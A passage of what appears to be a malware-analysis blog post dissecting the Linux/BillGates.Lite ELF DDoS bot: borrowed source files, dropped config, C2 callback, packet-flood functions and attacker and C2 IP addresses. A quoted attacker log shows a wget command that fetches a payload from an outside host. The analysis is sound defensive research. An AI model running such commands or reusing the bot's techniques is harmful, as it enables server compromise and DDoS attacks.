call this version as \u003Cb\u003ELinux\/BillGates.Lite\u003C\/b\u003E.  \u003Cp\u003EAs per seen in the file name of the ELF malware file in its panel itself, we all suspecting the actor of \u003Cb\u003EChinaZ \u003C\/b\u003Eis in behind of this malicious scheme.  \u003Cp\u003E\u003Ch2\u003EThe overview of \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E ELF malware family\u003C\/h2\u003E \u003Cp\u003EThis variant of ELF malware can be said as the most popular used one among the malware actors from \u003Ci\u003EPRC (People Rep of China)\u003C\/i\u003E area, for its stability, wide-ranged malicious function implemented and good in management of the user (read = malware actors). We follow the progress of \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E from the early stage, it was spotted in many infection, and \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E analysis were posted in this blog and several malware research blogs too.   \u003Cp\u003EBefore this version was spotted we all know the variant of \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E as \u003Cb\u003E\u003Ci\u003E(1) the installer\u003C\/i\u003E\u003C\/b\u003E (the full version with big bin one with RSA crypted embed ELF inside) and \u003Cb\u003E(2) \u003Ci\u003Ethe backdoor\u003C\/i\u003E\u003C\/b\u003E one that sometimes can be spotted in stand alone or embedded in the \u003Cb\u003ELinux\/BillGates installer\u003C\/b\u003E. There are also some spin-out versions or older code basis which using the less limited functions in the attack methods or CNC connection.  \u003Cp\u003EFor raising ELF malware awareness purpose I push in anyway I can think of, one of them is started and contributed a lot of samples from MalwareMustDie team research to the \u003Cb\u003EELF malware research repository\u003C\/b\u003E in \u003Cb\u003ELinux\/BillGates section\u003C\/b\u003E in \u003Cb\u003Ekernelmode.info\u003C\/b\u003E (\u003Ci\u003Ethank's to the mods team of KM who kindly let us use their good forum for this purpose\u003C\/i\u003E) here--\u003E[\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3429\"\u003Elink\u003C\/a\u003E], so if you have interest to see the historical growth of this variant it's all written in there. (\u003Ci\u003EPS: with I really hope you can help in contributing more ELF sample too, please support us!)\u003C\/i\u003E \u003Cp\u003EBased on the experience in handling this malware for a quite while, we can see its differences by comparison of the source code resource used of the \u003Cb\u003ELinux\/BillGates families\u003C\/b\u003E as per below picture:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-6CAHoKhIPuc\/Vdh3cK5X_TI\/AAAAAAAAS4I\/WispsJY4WCg\/s2720-Ic42\/BillGatesFamily.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-6CAHoKhIPuc\/Vdh3cK5X_TI\/AAAAAAAAS4I\/WispsJY4WCg\/s580-Ic42\/BillGatesFamily.png\u003E\u003C\/a\u003E\u003Cp\u003EHowever the old-fashioned Linux\/BillGates was designed for infecting a \u003Cb\u003E\"server\"\u003C\/b\u003E..it's a heavy-weight-fully-weaponized malicious executed binary, not a light-weight one, a bit big in size and consuming resources, which maybe doesn't fit to the trend that the \u003Cb\u003E\u003Ci\u003EIoT (Internet of Things)\u003C\/i\u003E\u003C\/b\u003E that are starting to be aimed by the malware crooks recently, which why I guess is the reason of the \u003Cb\u003ELinux\/BillGates.Lite\u003C\/b\u003E version came out as a light-weight version of this variant.  \u003Cp\u003EThe other reason that our team can think of is.. the actor is \u003Cb\u003EThe ChinaZ\u003C\/b\u003E. We keep on hammering this threat and actors with whatever ELF malware they released since day one we spotted them; we exposed, taking down, and reversed \u003Cb\u003Eeach one\u003C\/b\u003E of their scheme that we can collect, their builder\/templates..even their source code development too, which is obviously making this actors aggressively change their malware to keep their bad business running. And recently they tend not to use their original \u003Cb\u003ELinux\/ChinaZ\u003C\/b\u003E ELF anymore but starting to use several other PRC (\u003Ci\u003ERead: People Republic of China\u003C\/i\u003E) basis ELF malware. And it looks like they're on the \u003Cb\u003ELinux\/BillGates \u003C\/b\u003Ecodes now.  \u003Cp\u003E\u003Ch2\u003EThe highlights technical report of \u003Cb\u003EELF Linux\/BillGates.Lite\u003C\/b\u003E\u003C\/h2\u003E \u003Cp\u003E\u003Ch2\u003E1. Thread locking PID is gone..\u003C\/h2\u003E \u003Cp\u003EIf you happened to face a \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E infection before, you will find the usual drop of codes in the \u003Ci\u003E\/tmp\u003C\/i\u003E or \u003Ci\u003E\/var\/tmp\u003C\/i\u003E with the filename camouflaged as lock file (i.e. \u003Ci\u003Egates.lock\u003C\/i\u003E, etc) which contains the main PID of the malware process that is being used for the malware to stop its process gracefully under many chaos they created in the system, i.e. below snips: \u003Cpre class=\"brush: asm\"\u003Edump of  \/tmp\/gates.lock\u003Cbr \/\u003E0000000 PID1 PID2\u003Cbr \/\u003E0000004\u003Cbr \/\u003E\u003C\/pre\u003Ebut this variant is not having these functions which is the result of the functions in \u003Cb\u003E\u003Ci\u003EThreadMonGates.cpp\u003C\/i\u003E\u003C\/b\u003E in original \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E. I am raising this difference as the number one since this is the easiest way to recognize this variant from the previous original versions.  \u003Cp\u003E\u003Ch2\u003E2. Adaptation of \u003Cb\u003ELinux Elknot\u003C\/b\u003E malware's \u003Cb\u003EFake.cpp\u003C\/b\u003E source code\u003C\/h2\u003E \u003Cp\u003EThe other interesting part is the drop of fake configuration file contains the fake IP address. If you familiar with the \u003Cb\u003ELinux\/Elknot\u003C\/b\u003E ELF malware family, the recent version that is widely still used until now is the\u003Ci\u003E \u003Cb\u003Estripped \u0026 packed variant template\u003C\/b\u003E\u003C\/i\u003E that they are using in many of latest ELF builder tools. If you reverse those ELF it all has the \u003Ci\u003EFake.cpp\u003C\/i\u003E in their resources. That is the code that will drop the attack configuration if the ethernet IP address to be use for malicious purpose.   \u003Cp\u003EAlthough it is based on majority Linux\/\u003Cb\u003EBillGates\u003C\/b\u003E, the \u003Cb\u003ELinux\/BillGates.Lite\u003C\/b\u003E version is adapting the \u003Ci\u003EFake.cpp\u003C\/i\u003E source code of Linux\/Elknot (stripped\/packed version), to be used as initial config for performing attack.. Let us trail the assembly code for this mentioned function as per below.   \u003Cp\u003EThis is the sample, I picked the 32bit one:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-dbu5n0a1Okk\/Vdg7OiQQYpI\/AAAAAAAAS2o\/o8SN6QWlxx0\/s2512-Ic42\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-dbu5n0a1Okk\/Vdg7OiQQYpI\/AAAAAAAAS2o\/o8SN6QWlxx0\/s520-Ic42\/001.png\u003E\u003C\/a\u003E \u003Cp\u003EYou can grep the \"Fake\" \u003Ci\u003Esymbols \u003C\/i\u003Eto find the initiate part which is responsible to make the fake file. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Vqp8GeXUwcU\/Vdg7OlVLWQI\/AAAAAAAAS2w\/jru8g9rn-iY\/s2720-Ic42\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Vqp8GeXUwcU\/Vdg7OlVLWQI\/AAAAAAAAS2w\/jru8g9rn-iY\/s580-Ic42\/002.png\u003E\u003C\/a\u003E \u003Cp\u003EGo to the sym.\u003Cb\u003E\u003Ci\u003E_ZN5CFake10InitializeEv\u003C\/i\u003E\u003C\/b\u003E and you'll find operation to build this \"initial\" config file. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-syGx0IDwZMM\/Vdg7OoEV7PI\/AAAAAAAAS2s\/9JQ7JId4ug0\/s3576-Ic42\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-syGx0IDwZMM\/Vdg7OoEV7PI\/AAAAAAAAS2s\/9JQ7JId4ug0\/s580-Ic42\/003.png\u003E\u003C\/a\u003E \u003Cp\u003EThe above function overall operation can be traced per \u003Cb\u003E\u003Ci\u003Elinux system calls\u003C\/i\u003E\u003C\/b\u003E below: \u003Cpre class=\"brush: asm\"\u003Ereadlink(\"\/proc\/[PID\/exe\", \"\/[PATH]\/MALWARE\", 1024)\u003Cbr \/\u003Eopen(\"\/[PATH]\/MALWARENAME\\\\xmit.ini\", O_RDWR)\u003Cbr \/\u003Eunlink(\"\/[PATH]\/MALWARENAME\\\\xmit.ini\")\u003Cbr \/\u003Eopen(\"\/[PATH]\/MALWARENAME\\\\xmit.ini\", O_RDWR|O_CREAT|O_TRUNC, 0666)\u003Cbr \/\u003Ewrite(3, \"0\\r\\n192.168.x.xx:192.168.x.xx\\r\\n10000:60000\\r\\n\\r\\n0\\r\\n0:0:0\\r\\n\", 55)\u003Cbr \/\u003Eclose(3) \u003C\/pre\u003E \u003Cp\u003EWhich is resulted the dropped file in the executed surectory with hex as per below: \u003Cpre class=\"brush: asm\"\u003E00000000  30 0d 0a 31 39 32 2e 31  36 38 2e 37 2e 32 31 3a  |0..192.168.x.x:|\u003Cbr \/\u003E00000010  31 39 32 2e 31 36 38 2e  37 2e 32 31 0d 0a 31 30  |192.168.x.xx..10|\u003Cbr \/\u003E00000020  30 30 30 3a 36 30 30 30  30 0d 0a 0d 0a 30 0d 0a  |000:60000....0..|\u003Cbr \/\u003E00000030  30 3a 30 3a 30 0d 0a                              |0:0:0..|\u003Cbr \/\u003E00000037\u003C\/pre\u003EIt's the known config that's been used by \u003Cb\u003ELinux\/Elknot\u003C\/b\u003E to initiate the attack with assembling the local IP of the infected server, forming the port range of the malicious outbound attack.  \u003Cp\u003E\u003Ch2\u003E3. Originality of \u003Cb\u003EServerIP.cpp\u003C\/b\u003E (CNC connect code) combined w\/BillGates \u003Cb\u003EStatBase.cpp\u003C\/b\u003E\u003C\/h2\u003E \u003Cp\u003EOne interesting original function is spotted in the usage of \u003Cb\u003EServerIP.cpp\u003C\/b\u003E, in the way of the \u003Cb\u003ELinux\/BillGates.Lite\u003C\/b\u003E used in connecting to CNC for sending the statistic data of the victim's PC to \u003Cb\u003E\u003Ci\u003E\"gates\"\u003C\/i\u003E\u003C\/b\u003E (the botnet software in the actor's host). A hard coded address for the connection is used with the very different way with the overall quality of the well-known \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E code used, which is showing different coder, and\/or different source code set, with following by the call to the usage of \u003Cb\u003EStatBase.cpp\u003C\/b\u003E (a part of known Linux\/BillGates source code set) to send the grabbed statistic sensitive data of the infected system, like CPU info, memory, etc.. to the actor's botnet CNC. \u003Cbr\u003EPlease see the below explanation in disassembly screenshot for better explanation of the both codes used as illustration.\u003Cbr\u003E \u003Cp\u003EAs per previous method I describe above, a quick \"go\" to go to ServerIP \u0026 StatBase in by grep the ServerIP now \u0026 seek its initiation part, if the symbols are there is not that difficult to guess:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-EPpNinOrA6M\/VdhXgD3NgdI\/AAAAAAAAS3E\/szXGxmSEKpA\/s2720-Ic42\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-EPpNinOrA6M\/VdhXgD3NgdI\/AAAAAAAAS3E\/szXGxmSEKpA\/s580-Ic42\/004.png\u003E\u003C\/a\u003E \u003Cp\u003EYou can go from the entry point of the binary itself too, with is in these steps:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ZonYn5jsx6k\/VdnOiw0HWmI\/AAAAAAAAS6w\/MjlgIz2HfK8\/s2720-Ic42\/021.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ZonYn5jsx6k\/VdnOiw0HWmI\/AAAAAAAAS6w\/MjlgIz2HfK8\/s580-Ic42\/021.png\u003E\u003C\/a\u003E \u003Cp\u003ESo, if you are in the \u003Cb\u003EServerIP.cpp\u003C\/b\u003E now, at the \u003Cb\u003EServerIP::InitializeEv\u003C\/b\u003E \u003Ci\u003Efunction\u003C\/i\u003E, then trail down from that address \u003Ci\u003E0x0804f654\u003C\/i\u003E the \u003Cb\u003E_ZN9CServerIP10InitializeEv\u003C\/b\u003E function down until meet the \u003Ci\u003EPUSH\u003C\/i\u003E data used for gaining CNC connection IP address string. On the \u003Ci\u003Eoffset\u003C\/i\u003E of where those string data resides do check the \u003Ci\u003Exref\u003C\/i\u003E of next database called pointer which will lead to the \u003Cb\u003EStatBase.cpp\u003C\/b\u003E function. You can go further to decode the port number used for the CNC connection (which is 6009 in dec) etc.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-AigZ-Ot7hXc\/VdhXgTCfogI\/AAAAAAAAS3I\/5tMD52x23BA\/s2720-Ic42\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-AigZ-Ot7hXc\/VdhXgTCfogI\/AAAAAAAAS3I\/5tMD52x23BA\/s580-Ic42\/005.png\u003E\u003C\/a\u003E \u003Cp\u003EIn this recognition of which trail of functions and symbols goes which source codes and doing what action, I can almost instantly know the modification of the \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E source code is not done by the original coder himself, suggesting the actor is whether buying or achieving the \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E' code to modify by himself..or\/and combining the \u003Ci\u003Eancient version\u003C\/i\u003E of \u003Cb\u003ELinux\/Elknot\u003C\/b\u003E source code (maybe a cheap or free one) which was used between 2013 to mid 2014 \u003Cb\u003Ewhich is having the similar \u003Ci\u003EServerIP.cpp\u003C\/i\u003E source file\u003C\/b\u003E (oh..no..not again..). Yes, I can proof that with grepping sources of the old \u003Cb\u003ELinux\/Elknot\u003C\/b\u003E I reversed as can be seen in here--\u003E[\u003Ca href=\"https:\/\/pastebin.com\/vCH3vGQE\"\u003Elink\u003C\/a\u003E], and that explained why the CNC IP address is un-encrypted.  \u003Cp\u003E\u003Ch2\u003E4. Original CNC Callback\u003C\/h2\u003E \u003Cp\u003EAnother proof of the originality of this variant is the CNC data to be sent to CNC that produced by the malware in the form as per picture below. By the time I tested it the CNC was closed so I had to tweak kernel in \u003Cb\u003E\u003Ci\u003E*sys_call_table\u003C\/i\u003E\u003C\/b\u003E on the \u003Ci\u003Esys_write\u003C\/i\u003E [\u003Ca href=\"http:\/\/man7.org\/linux\/man-pages\/man2\/write.2.html\"\u003Elink\u003C\/a\u003E] interception to reproduce this string:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-5otrMONNuRI\/Vdhd2UQeThI\/AAAAAAAAS3Y\/haSYWCEbcUw\/s2720-Ic42\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5otrMONNuRI\/Vdhd2UQeThI\/AAAAAAAAS3Y\/haSYWCEbcUw\/s580-Ic42\/006.png\u003E\u003C\/a\u003E \u003Cbr\u003EWhich is showing the encryption pattern that hasn't been spotted before in \u003Cb\u003ELinux\/Elknot\u003C\/b\u003E nor \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E, and not even \u003Cb\u003ELinux\/ChinaZ\u003C\/b\u003E too (noted, below data is from my working pad, may not be too precise but is enough to show the pattern) :\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-4-AXtP-qsoU\/VdjhGLXUYeI\/AAAAAAAAS5Q\/OOrWligpjMI\/s2720-Ic42\/012.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-4-AXtP-qsoU\/VdjhGLXUYeI\/AAAAAAAAS5Q\/OOrWligpjMI\/s580-Ic42\/012.png\u003E\u003C\/a\u003E \u003Cbr\u003EYou can see \u0026 compare look of data above to BillGates, ChinaZ and Elknot CNC traffic as per initial CNC callback snapshot pictures recorded from several cases below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-mUSMU2WGUNs\/Vdjkytr1YII\/AAAAAAAAS5c\/Dn7vCQQ9Uf8\/s2720-Ic42\/111.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-mUSMU2WGUNs\/Vdjkytr1YII\/AAAAAAAAS5c\/Dn7vCQQ9Uf8\/s580-Ic42\/111.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003E5. Attack vector..original code undone?\u003C\/h2\u003E \u003Cp\u003EI see the different coded attack source code has been compiled in this variant. This part looks like originally coded, but I don't think the coding is 100% finished yet. The escalation of the code is suggesting an overhaul with the idea of \u003Cb\u003EThreatAtk.cpp\u003C\/b\u003E of the Linux\/BillGates, which in this variant the coder re-coded it into \u003Cb\u003EThreatAttack.cpp\u003C\/b\u003E and has using a bit of different symbols like these 69 names:\u003Cbr\u003E\u003Ca href=\"https:\/\/pastebin.com\/XxuRR0Cj\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-mGIUj_z65Ac\/VdhyVVr3QZI\/AAAAAAAAS3w\/cdfjpowxkjE\/s450-Ic42\/007.png\u003E\u003C\/a\u003E \u003Cp\u003EThe what it seems to be main attack functions are in below symbols which these are a suspected attacker main main functions, but strange, it hasn't been linked to any code in main management module of \u003Cb\u003E_ZN8CManagerC2Ev (CManager::CManager)\u003C\/b\u003E or other main major management functions. \u003Cpre class=\"brush: asm\"\u003E_ZN13CThreadAttackD2Ev\u003Cbr \/\u003E_ZN13CThreadAttackD1Ev\u003Cbr \/\u003E_ZN13CThreadAttackD0Ev\u003C\/pre\u003E \u003Cp\u003EIf you trail it further, you'll find the \u003Ci\u003Eweaponized functions\u003C\/i\u003E prepared for \u003Ci\u003Eattacks \u003C\/i\u003Eare here: \u003Cpre class=\"brush: asm\"\u003E_ZN13CThreadAttack7HttpAtkER8CSubTask\u003Cbr \/\u003E_ZN13CThreadAttack11FakeUserAtkER8CSubTask\u003Cbr \/\u003E_ZN13CThreadAttack6PktAtkER8CSubTaskRSt6vectorIjSaIjEE\u003C\/pre\u003E..and the below snip code shows that one function is actually having the actual aggressive code for launching the packet attack:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-2xunddhmeWg\/VdhyV8rn-_I\/AAAAAAAAS30\/LFWMqP_Li8I\/s2512-Ic42\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-2xunddhmeWg\/VdhyV8rn-_I\/AAAAAAAAS30\/LFWMqP_Li8I\/s580-Ic42\/008.png\u003E\u003C\/a\u003E\u003Cbr\u003E..and yes, this \u003Cb\u003E\"ThreadAttack::PktAtk\"\u003C\/b\u003E is the only one that being used (called) by other functions, to perform packet flood attack.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-iowUaiwD2L4\/VdhyWBzDNTI\/AAAAAAAAS34\/gNxntAMcNfA\/s2720-Ic42\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-iowUaiwD2L4\/VdhyWBzDNTI\/AAAAAAAAS34\/gNxntAMcNfA\/s580-Ic42\/009.png\u003E\u003C\/a\u003E\u003Cbr\u003ETo be noted: 1. There are so many functions that was there as skeleton but not fully coded. \u003Cbr\u003E2. You won't find these kind of attack codes in any Elknot either.. Elknot is old but is way much better coded one :-D \u003Cp\u003EThere are some more functions exists, please feel free to check it yourself :) I am through with this sample.. I wonder if there any crook out there who would actually buy a \"literally\" crap like this.. If there is, that person should ask his money back and hunt the ChinaZ actors for scamming :))  \u003Cp\u003E\u003Ch2\u003E5. Dependencies\u003C\/h2\u003E \u003Cp\u003ENothing is too important in this part, except the smaller size makes the lesser dependencies. This malware is statically compiled, it has many original call for its own file operation (thank's to the Linux\/BillGates code used), but this malware is depended on these three libraries: \u003Cpre class=\"brush: asm\"\u003Eld-2.13.so\u003Cbr \/\u003Elibc-2.13.so\u003Cbr \/\u003Elibnss_files-2.13.so\u003C\/pre\u003EThe first two libraries are required as the runtime+standard C functions library used, and the third one shows that Linux\/BillGates.Lite is relying to \u003Cb\u003Elibnss\u003C\/b\u003E (\u003Ci\u003EThe Naming Scheme of the NSS Modules\u003C\/i\u003E) for the internet name lookup operations. This is the strong point actually, if the \u003Cb\u003Elibnss\u003C\/b\u003E usage in a system can be somehow be more secured or hardened to be used by certain system's user only I bet many ELF malware can not make a lookup..since many of malware are using libnss to translate domain names.  \u003Cp\u003E\u003Ch2\u003E6. More Linux\/BillGates than Linux\/Elknot essense\u003C\/h2\u003E \u003Cp\u003EIt's interesting to find the combination of several malware code to be used to form a new malware, I wonder what was in the head of \u003Cb\u003EChinaZ\u003C\/b\u003E actors while building this :) Hence, this threat (ChinaZ) is well known on changing their codes and experimenting on several ELF malware codes.  \u003Cp\u003EAnyway, the code and its traces that can be trailed so far is showing the majority parts of this malware are compiled from \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E source codes (has original 15 .cpp source codes), there are 3 (three) modified .cpp suspected from \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E, and  2 (two) of the \u003Cb\u003ELinux\/Elknot\u003C\/b\u003E source codes, it's why we call it as \u003Cb\u003ELinux\/BillGates.Lite\u003C\/b\u003E. The picture below can illustrate it well:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-jUD44NPq4G8\/VdjpONOSCsI\/AAAAAAAAS5k\/52qd_mIztfE\/s2200\/015.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-jUD44NPq4G8\/VdjpONOSCsI\/AAAAAAAAS5k\/52qd_mIztfE\/s400\/015.png\u003E\u003C\/a\u003E \u003Cp\u003EAnd don't get me or our team wrong, we really don't against if there is any antivirus product's signature that is thinking this is an \u003Cb\u003ELinux\/Elknot\u003C\/b\u003E since, yes, two source code of \u003Ci\u003ELinux\/Elknot\u003C\/i\u003E sources are spotted there anyway. As long as this ELF new malware can be detected, it's really fine with us :)  \u003Cp\u003E\u003Ch2\u003EThe threat attack source summary and incident evidence\u003C\/h2\u003E \u003Cp\u003EThe SSH attacker: 199.83.94.78 \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"199.83.94.78\",\u003Cbr \/\u003E  \"hostname\": \"unassigned.psychz.net\",\u003Cbr \/\u003E  \"city\": \"Walnut\",\u003Cbr \/\u003E  \"region\": \"California\",\u003Cbr \/\u003E  \"country\": \"US\",\u003Cbr \/\u003E  \"loc\": \"34.0115,-117.8535\",\u003Cbr \/\u003E  \"org\": \"AS40676 Psychz Networks\",\u003Cbr \/\u003E  \"postal\": \"91789\"\u003C\/pre\u003E \u003Cp\u003EThe CNC: 183.56.173.197 \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"183.56.173.197\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Guangzhou\",\u003Cbr \/\u003E  \"region\": \"Guangdong\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"23.1167,113.2500\",\u003Cbr \/\u003E  \"org\": \"AS58543 Guangdong\"\u003C\/pre\u003E \u003Cp\u003EThe same attacker IP is also infecting other malware from the same HFS panel in the different session as per shown in the below log: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-enYyLWMsBzQ\/VdiaBUhoDdI\/AAAAAAAAS4k\/bYimBF8LofI\/s2720-Ic42\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-enYyLWMsBzQ\/VdiaBUhoDdI\/AAAAAAAAS4k\/bYimBF8LofI\/s580-Ic42\/011.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003EThis log can be used as incident and cyber attack evidence\u003C\/i\u003E.  \u003Cp\u003EThe origin of this new ELF threat is suspected related to the previous blog post we released about the \u003Cb\u003EChinaZ \u003C\/b\u003Ewhich wrote in the last part that \u003Cfont color=yellow\u003Ethe actor is seeking to buy the source code of the \u003Cb\u003ELinux\/BillGate\u003C\/b\u003Es in Chinese language forum\u003C\/font\u003E---\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/08\/mmd-0037-2015-chinaz-and-ddos123xyz.html#sourcecode\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003E\u003Ch2\u003EMore badness on AS40676 Psychz Networks,USA\u003C\/h2\u003E \u003Cp\u003EThe Source of the infection attack is coming from AS40676 Psychz Networks, an IDC in USA. Many previous attacks I reported on ELF infection came from this network, we reported this ASN for over a year with list of the contact ID responsible for each that I could cracked.\u003Cbr\u003E\u003Cp\u003EThe previous ELF incident that came from this ASN, was also using the \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E (the backdoor type) was recorded \u0026 reported too. The data is as per shown in the below series of snapshots. I hope authority in United States will take down this bad network soon, many countries including mine is suffering from attack coming from this network. I suggest fellow server admins to block this whole ASN for safety purpose if you don't need to have any reason to connect to this network.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/--1TYWbuy21o\/Vdlxek51vqI\/AAAAAAAAS6A\/7WFc3eEm9zw\/s2720-Ic42\/2000.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/--1TYWbuy21o\/Vdlxek51vqI\/AAAAAAAAS6A\/7WFc3eEm9zw\/s580-Ic42\/2000.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-MJQcw7wFAoc\/VdlxeqnxYVI\/AAAAAAAAS6Q\/GBRihj2pOAI\/s2640-Ic42\/2001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-MJQcw7wFAoc\/VdlxeqnxYVI\/AAAAAAAAS6Q\/GBRihj2pOAI\/s580-Ic42\/2001.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ouVNSP_kdeM\/VdlxeriD2BI\/AAAAAAAAS6E\/4UlBW5KHPbA\/s3720-Ic42\/2003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ouVNSP_kdeM\/VdlxeriD2BI\/AAAAAAAAS6E\/4UlBW5KHPbA\/s580-Ic42\/2003.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-HJMUvOjbCvA\/VdlxfzCYmqI\/AAAAAAAAS6U\/mTZFWUxhzss\/s2512-Ic42\/3003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-HJMUvOjbCvA\/VdlxfzCYmqI\/AAAAAAAAS6U\/mTZFWUxhzss\/s580-Ic42\/3003.png\u003E\u003C\/a\u003E\u003Cbr\u003EIn this incident even the malware actors had chance to fix the miss in their code..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-2lhAyMx_5g8\/VdlxfblGZ-I\/AAAAAAAAS6c\/XVH4VTaa5IU\/s3720-Ic42\/3002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-2lhAyMx_5g8\/VdlxfblGZ-I\/AAAAAAAAS6c\/XVH4VTaa5IU\/s580-Ic42\/3002.png\u003E\u003C\/a\u003E \u003Cp\u003EMore attack logged... \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EMore  AS40676 Psychz Networks \u003Ca href=\"https:\/\/twitter.com\/hashtag\/USA?src=hash\"\u003E#USA\u003C\/a\u003E attacker log\u0026#10;2015-08-20 09:04:26 [session=2128,107.160.75.144] CMD: wget http:\/\/107.160. 75.144:1234\/qsba\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/635377839638884352\"\u003EAugust 23, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EOne more, a recent incident with the same ASN as origin.. \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003ELatest evidence of AS40676 \u003Ca href=\"https:\/\/twitter.com\/hashtag\/PsychzNet?src=hash\"\u003E#PsychzNet\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/China?src=hash\"\u003E#China\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E abuse\u0026#10;Case: \u003Ca href=\"https:\/\/t.co\/qlnhFw64un\"\u003Ehttps:\/\/t.co\/qlnhFw64un\u003C\/a\u003E\u0026#10;imgur: \u003Ca href=\"http:\/\/t.co\/YJr9UMrKQo\"\u003Ehttp:\/\/t.co\/YJr9UMrKQo\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/d7PcQDp90U\"\u003Epic.twitter.com\/d7PcQDp90U\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/635818086004858880\"\u003EAugust 24, 2015\u003C\/a\u003E\u003C\/blockquote\u003E \u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003E\u003Ch2\u003ESamples \u0026 Epilogue\u003C\/h2\u003E \u003Cp\u003EThe samples are uploaded to the virus total in [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/6ec519a42efb59224ba5a5767a62f10f3356699cf3c6d70854a35115c9018442\/analysis\/1440249503\/\"\u003Ex32\u003C\/a\u003E] and [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/d00680b98ed9402233f2789bb31cfa3ef8d2aca734aa3fd9afa908125f597a89\/analysis\/1440249531\/\"\u003Ex64\u003C\/a\u003E].\u003Cbr\u003EFor the research purpose I uploaded samples to ElF malware repository in kernelmode--\u003E[\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3429\u0026p=26578#p26578\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003EThe server.dat incident's sample is 